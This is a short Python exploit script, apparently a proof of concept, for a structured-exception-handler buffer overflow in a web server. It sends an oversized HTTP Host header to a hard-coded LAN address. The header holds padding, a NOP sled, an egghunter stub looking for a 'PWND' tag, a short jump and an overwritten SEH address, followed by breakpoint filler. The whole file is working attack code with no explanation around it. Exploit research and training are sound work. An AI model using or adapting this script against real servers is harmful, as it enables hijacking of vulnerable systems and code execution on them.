import socket
import sys

host = "192.168.100.118"
port = 80

# nseh = "\xCC\xCC\xCC\xCC"
nseh = "\xeb\x82\x90\x90"
seh = "\x9b\x4b\x40\x00" # 0x00404b9b

# egghunter code - PWND - 20 + 32 bytes
# 52 bytes Total
egghunter  = "\x90" * 20
egghunter += "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x50\x57\x4E\x44\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

crash  = "\x41" * 1425
crash += "\x90" * 72
crash += egghunter
crash += nseh
crash += seh

crash += "\xCC" * (5000 - len(crash))

req = "GET / HTTP/1.1\r\n"
req += "Host: /.:/" + crash + "\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "DNT: 1\r\n"
req += "Connection: keep-alive\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "Cache-Control: max-age=0\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()


